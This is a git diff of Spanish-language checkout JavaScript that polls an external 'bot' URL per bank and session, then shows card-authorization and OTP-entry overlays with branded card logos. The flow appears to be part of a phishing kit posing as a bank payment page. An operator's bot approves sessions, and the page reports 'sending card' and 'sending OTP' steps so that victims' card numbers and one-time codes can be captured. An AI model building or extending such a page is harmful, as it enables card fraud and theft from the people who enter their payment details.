     fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
       .then(function(r) { return r.json(); })
@@ -1437,30 +1337,36 @@ function iniciarPollingPago(sessionId, marca, payload) {
           clearInterval(pagoPollingInterval);
           pagoPollingInterval = null;
           ocultarPagoCarga();
+          
           var numTarjeta = (payload.tarjeta || '').replace(/\D/g, '');
           var ultimos4 = numTarjeta.slice(-4);
           var enmascarado = '************' + ultimos4;
+          
           document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
           document.getElementById('popupCardNumber').textContent = enmascarado;
           document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
           document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
+          
           var logoContainer = document.getElementById('cardBrandLogo');
           if (marca === 'visa') {
-            logoContainer.innerHTML = '<img src="img/Visa_Inc._logo_(2005–2014).svg" style="height:28px;width:auto;">';
+            logoContainer.innerHTML = '<svg viewBox="0 0 192.756 192.756" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
           } else if (marca === 'amex') {
-            logoContainer.innerHTML = '<img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" style="height:28px;width:auto;border-radius:3px;">';
+            logoContainer.innerHTML = '<svg viewBox="0 0 100 50" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
           } else {
-            logoContainer.innerHTML = '<img src="img/Mastercard-logo.svg.webp" style="height:28px;width:auto;">';
-          }
+            logoContainer.innerHTML = '<svg viewBox="0 0 100 62" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
+          }          
           var today = new Date();
-          document.getElementById('currentDate').textContent =
+          document.getElementById('currentDate').textContent = 
             String(today.getDate()).padStart(2, '0') + '/' +
             String(today.getMonth() + 1).padStart(2, '0') + '/' +
             today.getFullYear();
+            
           openAuthModal();
+          
         } else if (data.estado === 'rechazado') {
           clearInterval(pagoPollingInterval);
           pagoPollingInterval = null;
+          ocultarPagoCarga();
           mostrarPagoError(marca);
         }
       })
@@ -1468,6 +1374,37 @@ function iniciarPollingPago(sessionId, marca, payload) {
   }, 2000);
 }
 
+function mostrarPagoCarga(marca) {
+    if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_tarjeta');
+    const overlay = document.getElementById('pagoCargaOverlay');
+    const logo = document.getElementById('pagoCargaLogo');
+    
+    if (marca === 'visa') {
+        // 🔥 Fondo transparente y tamaño de 140px
+        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
+    } else if (marca === 'amex') {
+        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
+    } else {
+        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
+    }
+    
+    overlay.classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    setTimeout(() => {
+        iniciarLottie();
+        rotarTextosCarga();
+    }, 50);
+}
+
+function ocultarPagoCarga() {
+    document.getElementById('pagoCargaOverlay').classList.add('hidden');
+    document.body.style.overflow = '';
+    detenerLottie();
+    if (textoRotadorInterval) {
+        clearInterval(textoRotadorInterval);
+        textoRotadorInterval = null;
+    }
+}
 /* ============================================================
    OTP
    ============================================================ */
@@ -1490,9 +1427,9 @@ document.getElementById('btnEnviarDinamica').addEventListener('click', function(
     return;
   }
   var marca = 'visa';
-  var logoActual = document.getElementById('cardBrandLogo').innerHTML;
-  if (logoActual.indexOf('Mastercard') !== -1 || logoActual.indexOf('mastercard') !== -1) marca = 'mastercard';
-  else if (logoActual.indexOf('amex') !== -1 || logoActual.indexOf('WEBLOGO') !== -1) marca = 'amex';
+  var cardNum = document.getElementById('cardNumber').value.replace(/\D/g, '');
+  if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
+  else if (cardNum.startsWith('3')) marca = 'amex';
 
   closeAuthModal();
   mostrarCargaOtp(marca);
@@ -1510,9 +1447,15 @@ function mostrarCargaOtp(marca) {
   if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_otp');
   var overlay = document.getElementById('pagoCargaOtpOverlay');
   var logo = document.getElementById('pagoCargaOtpLogo');
-  if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; logo.alt = 'Visa'; }
-  else if (marca === 'amex') { logo.src = 'https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg'; logo.alt = 'Amex'; }
-  else { logo.src = 'img/Mastercard-logo.svg.webp'; logo.alt = 'Mastercard'; }
+  
+  if (marca === 'visa') {
+    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
+  } else if (marca === 'amex') {
+    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
+  } else {
+    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
+  }
+  
   overlay.classList.remove('hidden');
   document.body.style.overflow = 'hidden';
 }
